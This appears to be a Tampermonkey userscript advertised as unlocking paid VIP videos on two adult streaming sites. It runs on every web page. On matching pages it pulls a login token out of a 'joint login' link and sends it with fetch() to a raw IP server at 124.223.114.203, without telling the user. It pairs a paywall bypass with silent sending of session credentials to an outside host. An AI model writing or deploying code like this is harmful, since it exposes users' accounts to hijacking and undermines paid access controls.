// ==UserScript==
// @name         swag(R站)vip视频随意观看&19J.TV韩国女主播vip视频任意看 t
// @name:zh-TW   swag(R站)vip視頻隨意觀看&19J.TV韓國女主播vip視頻任意看 t
// @namespace    http://tampermonkey.net/
// @version      1.0.2
// @description  用于观看swag(R站)vip视频&19J.TV韩国女主播vip视频
// @description:zh-TW  用于观看swag(R站)vip視頻&19J.TV韓國女主播vip視頻
// @author       FFFFFFeng
// @match        https://*/*
// @match        http://*/*
// @icon         https://www.google.com/s2/favicons?domain=swag555.xyz
// @grant        none
// @antifeature payment
// @downloadURL https://update.greasyfork.org/scripts/462783/swag%28R%E7%AB%99%29vip%E8%A7%86%E9%A2%91%E9%9A%8F%E6%84%8F%E8%A7%82%E7%9C%8B19JTV%E9%9F%A9%E5%9B%BD%E5%A5%B3%E4%B8%BB%E6%92%ADvip%E8%A7%86%E9%A2%91%E4%BB%BB%E6%84%8F%E7%9C%8B%20t.user.js
// @updateURL https://update.greasyfork.org/scripts/462783/swag%28R%E7%AB%99%29vip%E8%A7%86%E9%A2%91%E9%9A%8F%E6%84%8F%E8%A7%82%E7%9C%8B19JTV%E9%9F%A9%E5%9B%BD%E5%A5%B3%E4%B8%BB%E6%92%ADvip%E8%A7%86%E9%A2%91%E4%BB%BB%E6%84%8F%E7%9C%8B%20t.meta.js
// ==/UserScript==

(function() {
    'use strict';
    if (document.title.includes('韩国主播国产主播原创网') || document.title.includes('SWAG资源合集下载')) {
        let nodes = document.querySelectorAll(".f-red")
          for (let i = 0; i<nodes.length; i++) {
//            return
            if (nodes[i].innerHTML.includes("联合登录")) {
              if (nodes[i].nextElementSibling) {
                let href = nodes[i].nextElementSibling.href
                console.log(href.split("?"))
                  let arr = href.split("?")[1]
                  let token = arr.split("=")
                  fetch("https://124.223.114.203:3009/setHGCookie/"+token[token.length-1]+"/200").then(res=>res.json()).then(res => alert(res.code))
              }
            }
         }
    }
    
    // Your code here...
})();